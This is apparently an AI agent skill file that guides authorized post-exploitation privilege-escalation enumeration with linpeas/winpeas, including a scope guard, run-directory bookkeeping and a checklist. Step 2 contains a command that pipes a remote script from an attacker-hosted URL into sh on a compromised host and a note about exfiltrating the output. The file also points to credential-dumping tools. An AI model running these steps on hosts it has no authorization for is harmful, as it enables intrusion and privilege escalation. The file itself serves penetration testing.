---
name: linpeas
description: >
  Use after an initial foothold to enumerate local privilege-escalation vectors on a compromised
  host with linpeas/winpeas (PEASS-ng) — SUID, capabilities, cron, creds, misconfigs, kernel —
  then turn red/yellow highlights into concrete abuse via GTFOBins/LOLBAS. Runs after a foothold
  skill; feeds the privesc exploit step. Not for remote/network enum (nmap/netexec).
arguments: "lhost_url [os]"
model: inherit
effort: medium
context: inline
agent:
---

# linpeas / winpeas — automated privilege-escalation enumeration (PEASS-ng)

**Scope guard:** Authorized post-exploitation only (in-scope program / lab / owned) on a host you already have an authorized foothold on. linpeas is noisy/slow — fine in labs, think twice in sensitive environments. Abort if the host or the foothold is not in scope.

## Goal (desired outcome)
Surface likely local privilege-escalation vectors (SUID, caps, cron, creds, misconfigs, kernel) on a
compromised host, capture the full output for review, and turn the highest-signal highlights into a
concrete, verified escalation path.

## Steps
1. **Precondition / scope / transfer.** Confirm the foothold is authorized and in scope. Anchor a
   timestamped run directory **on your own box** (never write under `skills/`) to store the captured
   output pulled back from the target:
   ```bash
   ROOT="$(git rev-parse --show-toplevel)"
   RUN="$ROOT/out/linpeas/$(date +%Y%m%dT%H%M%S)"
   mkdir -p "$RUN/notes"
   echo "foothold host confirmed in scope: <who/when/program-or-lab>" > "$RUN/notes/scope.txt"
   : > "$RUN/run.log"; : > "$RUN/notes/vectors.md"
   ```
2. **Run on the target, capture everything.** Transfer and execute (host the script over HTTP from
   your box), teeing the full colorized output to a file you retrieve into `$RUN/linpeas.txt`:
   ```bash
   # on target (Linux): pull from your HTTP server and keep all checks (-a), save output
   curl <lhost_url>/linpeas.sh | sh -s -- -a 2>&1 | tee /tmp/linpeas.txt
   # Windows equivalent: winPEASx64.exe > winpeas.txt
   # then exfil /tmp/linpeas.txt back into $RUN/linpeas.txt
   ```
3. **Focus red/yellow highlights.** PEASS colour-codes the most promising findings
   (red/yellow = likely vector). Triage those first, not the whole dump.
4. **Cross-check vectors.** Map each candidate (SUID binary, writable cron, sudo rule, capability,
   kernel version) against **GTFOBins / LOLBAS** and known CVEs to get a concrete abuse command.
   Record each candidate + its abuse command in `notes/vectors.md`.
5. **Exploit the most reliable path + marker.** Verify before firing; pick the most reliable vector.
   Always write a run marker so "ran but nothing obvious" ≠ "didn't run":
   ```bash
   if [ -s "$RUN/notes/vectors.md" ]; then echo "linpeas: candidate vectors recorded" > "$RUN/summary.txt";
   else echo "no obvious privesc vector" > "$RUN/summary.txt"; echo "- none identified" >> "$RUN/notes/vectors.md"; fi
   ```
   Then write the run record `_run.json` into `$RUN/` (schema in Output formats).

## Modern tooling & alternatives
PEASS-ng: `linpeas.sh` (Linux), `winPEASx64.exe` (Windows). Companions: `pspy` (watch cron/processes
without root), `linux-exploit-suggester` / `wesng` (map kernel/OS → known exploits). For AD post-ex
pivot to `mimikatz` / `impacket secretsdump`.

## Output formats
Colorized stdout (`-a` runs all checks); tee/pipe to a file for review — retrieved into
`$RUN/linpeas.txt`. This skill also writes `$RUN/notes/vectors.md` (candidate vectors + abuse
commands), `$RUN/summary.txt` (run marker), `$RUN/run.log`, and a run record `$RUN/_run.json`:
```json
{
  "skill": "linpeas",
  "target": "<foothold host>",
  "run_dir": "out/linpeas/<timestamp>",
  "started": "<ISO8601>",
  "finished": "<ISO8601>",
  "status": "complete",
  "items": {
    "scope-confirmed":  { "attempted": true, "ok": true, "evidence": "notes/scope.txt" },
    "enum-captured":    { "attempted": true, "ok": true, "evidence": "linpeas.txt" },
    "vectors-analyzed": { "attempted": true, "ok": true, "evidence": "notes/vectors.md" },
    "results-recorded": { "attempted": true, "ok": true, "evidence": "summary.txt" }
  },
  "errors": []
}
```
`status` ∈ `complete | partial | error`. On a hard failure (no foothold, transfer blocked, out of
scope) set `status: error` and push a human-readable line to `errors[]`.

## RAG / shared data / cross-skill
**Ideal RAG = GTFOBins + LOLBAS + HackTricks privesc**, so the agent turns a finding ("SUID on
`find`", "writable cron") into a concrete abuse command. Runs after any initial-foothold skill
(`metasploit`, web exploit); feeds the escalation step and AD post-ex (`impacket`).

## Checklist
```yaml
checklist:
  - id: scope-confirmed
    desc: Authorized foothold host confirmed in scope before running (noisy tool)
    verify: judge
    evidence: notes/scope.txt
    on_fail: fail
    required: true
  - id: enum-captured
    desc: linpeas/winpeas run and full output captured into the run directory
    verify: nonempty
    evidence: linpeas.txt
    on_fail: redo-skill
    required: true
  - id: vectors-analyzed
    desc: Highlights cross-checked against GTFOBins/LOLBAS/CVEs; candidates recorded (or "none")
    verify: nonempty
    evidence: notes/vectors.md
    on_fail: redo-part
    required: true
  - id: results-recorded
    desc: Run marker written (even when no vector found)
    verify: nonempty
    evidence: summary.txt
    on_fail: redo-skill
    required: true
```

## Notes / pitfalls
- **Noisy / slow** — fine in labs, think twice in sensitive environments; `scope-confirmed` fails
  hard (`on_fail: fail`).
- **Don't blindly run suggested exploits** — verify each vector (version, writability, path) first;
  kernel exploits can crash the host.
- Triage red/yellow highlights, not the whole dump — then map to a concrete GTFOBins/LOLBAS command.
- `pspy` catches root cron/processes that a one-shot linpeas run can miss.
- A run that finds no vector must still write `summary.txt` and a `- none` line in `vectors.md` so
  "ran but empty" ≠ "didn't run".
- Never write output under `skills/`; the run directory is always anchored to the repo root via
  `git rev-parse --show-toplevel` under `out/linpeas/<timestamp>/` (git-ignored).
